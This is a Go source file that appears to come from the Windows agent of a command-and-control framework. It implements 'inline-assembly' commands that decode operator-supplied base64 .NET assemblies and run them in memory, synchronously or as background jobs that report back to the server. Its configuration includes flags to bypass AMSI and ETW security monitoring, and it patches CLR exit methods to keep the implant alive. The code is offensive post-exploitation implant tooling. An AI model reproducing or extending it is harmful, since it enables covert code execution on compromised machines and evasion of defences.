// server/docker/payloads/Windows/inline_assembly.go

//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"time"
)

var (
	clrExecutionMutex sync.Mutex
	clrExecutionCount int
)

var (
	exitPreventionOnce sync.Once
	exitPrevention     *CLRExitPrevention
	exitMethodsPatched bool
)

func InitializeExitPrevention() {
	exitPreventionOnce.Do(func() {
		exitPrevention = NewCLRExitPrevention()

		if err := exitPrevention.PatchAllExitMethods(); err != nil {
		} else {
			exitMethodsPatched = true
			fmt.Println("[+] Exit prevention initialized successfully")
		}
	})
}

// InlineAssemblyCommand handles synchronous inline .NET assembly execution
type InlineAssemblyCommand struct{}

func (c *InlineAssemblyCommand) Name() string {
	return "inline-assembly"
}

func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if runtime.GOOS != "windows" {
		return CommandResult{
			Output:   "Error: Inline assembly execution is only supported on Windows",
			ExitCode: 1,
		}
	}

	// Track execution count
	clrExecutionMutex.Lock()
	clrExecutionCount++
	executionNumber := clrExecutionCount
	clrExecutionMutex.Unlock()

	// Initialize exit prevention before any assembly execution
	InitializeExitPrevention()

	var output strings.Builder

	// Get the command data from context first
	var configData string

	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		// Use the data from the current command context
		configData = ctx.CurrentCommand.Data
	} else if len(args) > 0 {
		// Fall back to args if provided
		configData = strings.Join(args, " ")
	} else {
		return CommandResult{
			Output:   "Error: No assembly data provided",
			ExitCode: 1,
		}
	}

	// Parse the JSON configuration
	var config struct {
		AssemblyB64 string   `json:"assembly_b64"`
		Arguments   []string `json:"arguments"`
		AppDomain   string   `json:"app_domain"`
		BypassAMSI  bool     `json:"bypass_amsi"`
		BypassETW   bool     `json:"bypass_etw"`
		RevertETW   bool     `json:"revert_etw"`
		EntryPoint  string   `json:"entry_point"`
		UsePipe     bool     `json:"use_pipe"`
		PipeName    string   `json:"pipe_name"`
	}

	if err := json.Unmarshal([]byte(configData), &config); err != nil {
		// Try to parse as base64 if JSON fails
		if _, decodeErr := base64.StdEncoding.DecodeString(configData); decodeErr == nil {
			config.AssemblyB64 = configData
			// Use remaining args as arguments if they exist
			if len(args) > 1 {
				config.Arguments = args[1:]
			}
		} else {
			return CommandResult{
				Output:   fmt.Sprintf("Error parsing configuration: %v", err),
				ExitCode: 1,
			}
		}
	}

	// Decode assembly
	assemblyBytes, err := base64.StdEncoding.DecodeString(config.AssemblyB64)
	if err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Error decoding assembly: %v", err),
			ExitCode: 1,
		}
	}

	// Detect assembly information
	isDLL := c.isDLLAssembly(assemblyBytes)
	assemblyType := "EXE"
	if isDLL {
		assemblyType = "DLL"
	}

	// Build output header
	output.WriteString(fmt.Sprintf("[*] Inline Assembly Execution #%d\n", executionNumber))
	output.WriteString(fmt.Sprintf("[*] Assembly type: %s\n", assemblyType))
	output.WriteString(fmt.Sprintf("[*] Assembly size: %d bytes\n", len(assemblyBytes)))
	output.WriteString(fmt.Sprintf("[*] .NET version: v4.0.30319\n"))

	// Check for problematic patterns
	for _, arg := range config.Arguments {
		if strings.Contains(strings.ToLower(arg), "/runfor") {
			output.WriteString("[!] Detected /runfor parameter - exit protection enabled\n")
			break
		}
	}

	if len(config.Arguments) > 0 {
		output.WriteString(fmt.Sprintf("[*] Arguments: %v\n", config.Arguments))
	}

	if executionNumber > 1 {
		output.WriteString(fmt.Sprintf("[!] Warning: This is execution #%d. CLR state may be corrupted.\n", executionNumber))
		output.WriteString("[!] If execution fails, agent restart may be required.\n")
	}

	// Show exit prevention status
	if exitMethodsPatched {
		output.WriteString(fmt.Sprintf("[+] Exit prevention active: %d methods patched\n", len(exitPrevention.GetPatchedMethods())))
	}

	output.WriteString("========================================\n")

	// Execute with protection (this method is defined in action_inline_assembly.go)
	assemblyOutput, exitCode := c.executeWindowsAssembly(assemblyBytes, config, executionNumber)

	output.WriteString(assemblyOutput)

	return CommandResult{
		Output:   output.String(),
		ExitCode: exitCode,
	}
}

// isDLLAssembly checks if the assembly is a DLL
func (c *InlineAssemblyCommand) isDLLAssembly(assemblyBytes []byte) bool {
	// Check PE headers to determine if it's a DLL
	if len(assemblyBytes) < 0x3C+4 {
		return false
	}

	// Check for MZ header
	if assemblyBytes[0] != 'M' || assemblyBytes[1] != 'Z' {
		return false
	}

	// Get PE header offset
	peOffset := int32(assemblyBytes[0x3C]) |
		int32(assemblyBytes[0x3D])<<8 |
		int32(assemblyBytes[0x3E])<<16 |
		int32(assemblyBytes[0x3F])<<24

	if int(peOffset+0x17) >= len(assemblyBytes) {
		return false
	}

	// Check characteristics for DLL flag (0x2000)
	characteristics := uint16(assemblyBytes[peOffset+0x16]) | uint16(assemblyBytes[peOffset+0x17])<<8
	return (characteristics & 0x2000) != 0
}

// InlineAssemblyAsyncCommand handles async inline .NET assembly execution
type InlineAssemblyAsyncCommand struct {
	InlineAssemblyCommand
}

func (c *InlineAssemblyAsyncCommand) Name() string {
	return "inline-assembly-async"
}

// Execute method for InlineAssemblyAsyncCommand to use the new async execution
func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Generate a unique job ID
	jobID := fmt.Sprintf("inline_asm_%d", time.Now().UnixNano())

	// Get the current command from context
	var currentCmd Command
	if ctx.CurrentCommand != nil {
		currentCmd = *ctx.CurrentCommand
		currentCmd.JobID = jobID
	}

	// Create assembly job for tracking
	job := &AssemblyJob{
		ID:          jobID,
		CommandID:   currentCmd.CommandID,
		CommandDBID: currentCmd.CommandDBID,
		AgentID:     currentCmd.AgentID,
		Name:        currentCmd.Filename,
		Status:      "running",
		StartTime:   time.Now(),
		CancelChan:  make(chan bool, 1),
		Command:     currentCmd,
	}

	// Add job to assembly job manager
	assemblyJobManager.AddJob(job)

	// Also create job info for commandQueue tracking (for compatibility)
	jobInfo := JobInfo{
		ID:        jobID,
		StartTime: time.Now(),
		Filename:  currentCmd.Filename,
		Active:    true,
		Type:      "inline-assembly-async",
	}

	// Store job info in the global commandQueue
	if commandQueue != nil {
		commandQueue.mu.Lock()
		commandQueue.activeJobs[jobID] = jobInfo
		commandQueue.mu.Unlock()
	}

	// Start async execution
	go func() {
		defer func() {
			if r := recover(); r != nil {
				job.OutputMutex.Lock()
				job.Status = "failed"
				job.Error = fmt.Errorf("Assembly execution crashed: %v", r)
				endTime := time.Now()
				job.EndTime = &endTime
				job.Output.WriteString(fmt.Sprintf("\n[!] Assembly crashed: %v\n", r))
				finalOutput := job.Output.String()
				job.OutputMutex.Unlock()

				// Send crash result
				crashResult := CommandResult{
					Output:      finalOutput,
					Error:       job.Error,
					ExitCode:    -1,
					CompletedAt: time.Now().Format(time.RFC3339),
					JobID:       jobID,
				}
				if resultManager != nil {
					resultManager.AddResult(&crashResult)
				}
			}
		}()

		// Parse the assembly config
		var config struct {
			AssemblyB64 string   `json:"assembly_b64"`
			Arguments   []string `json:"arguments"`
			AppDomain   string   `json:"app_domain"`
			BypassAMSI  bool     `json:"bypass_amsi"`
			BypassETW   bool     `json:"bypass_etw"`
			RevertETW   bool     `json:"revert_etw"`
			EntryPoint  string   `json:"entry_point"`
			UsePipe     bool     `json:"use_pipe"`
			PipeName    string   `json:"pipe_name"`
		}

		// Parse from the Data field
		if currentCmd.Data != "" {
			if err := json.Unmarshal([]byte(currentCmd.Data), &config); err != nil {
				job.OutputMutex.Lock()
				job.Status = "failed"
				job.Error = err
				job.Output.WriteString(fmt.Sprintf("Failed to parse assembly config: %v", err))
				endTime := time.Now()
				job.EndTime = &endTime
				job.OutputMutex.Unlock()
				return
			}
		}

		// Decode assembly
		assemblyBytes, err := base64.StdEncoding.DecodeString(config.AssemblyB64)
		if err != nil {
			job.OutputMutex.Lock()
			job.Status = "failed"
			job.Error = err
			job.Output.WriteString(fmt.Sprintf("Failed to decode assembly: %v", err))
			endTime := time.Now()
			job.EndTime = &endTime
			job.OutputMutex.Unlock()
			return
		}

		// Execute with async capture
		var exitCode int

		if runtime.GOOS == "windows" {
			// Use the Windows-specific async method
			tokenContext := captureCurrentAssemblyTokenContext()
			exitCode, err = c.executeWindowsAssemblyAsync(assemblyBytes, config, job, tokenContext)
		} else {
			// Fail on non-Windows platforms
			err = fmt.Errorf("inline assembly async is only supported on Windows")
			exitCode = -1
			job.OutputMutex.Lock()
			job.Output.WriteString("[!] Inline assembly async is only supported on Windows\n")
			job.OutputMutex.Unlock()
		}

		// Update job status based on result
		job.OutputMutex.Lock()
		endTime := time.Now()
		job.EndTime = &endTime

		if err != nil {
			if strings.Contains(err.Error(), "terminated by user") {
				job.Status = "killed"
			} else {
				job.Status = "failed"
				job.Error = err
				if !strings.Contains(job.Output.String(), err.Error()) {
					job.Output.WriteString(fmt.Sprintf("\n[!] Execution failed: %v\n", err))
				}
			}
		} else {
			job.Status = "completed"
			if !strings.Contains(job.Output.String(), "Exit code:") {
				job.Output.WriteString(fmt.Sprintf("\n[+] Execution completed (exit code: %d)\n", exitCode))
			}
		}

		finalOutput := job.Output.String()
		job.OutputMutex.Unlock()

		// Mark job as complete in commandQueue
		if commandQueue != nil {
			commandQueue.mu.Lock()
			if queueJob, exists := commandQueue.activeJobs[jobID]; exists {
				queueJob.Active = false
				commandQueue.activeJobs[jobID] = queueJob
			}
			commandQueue.mu.Unlock()
		}

		// CRITICAL: Send final result back to server
		// We need to include the Command data for the server to identify this result
		finalResult := CommandResult{
			Command:     currentCmd, // Include the command so server knows what this is for
			Output:      finalOutput,
			ExitCode:    exitCode,
			CompletedAt: time.Now().Format(time.RFC3339),
			JobID:       jobID,
		}

		// Send the result back through the result manager
		if resultManager != nil {
			if err := resultManager.AddResult(&finalResult); err != nil {
			} else {
			}
		} else {
		}

	}()

	return CommandResult{
		Output:      fmt.Sprintf("[+] Async inline assembly execution started (Job ID: %s)\n[*] Use 'inline-assembly-output %s' to retrieve output", jobID, jobID),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
		JobID:       jobID,
	}
}
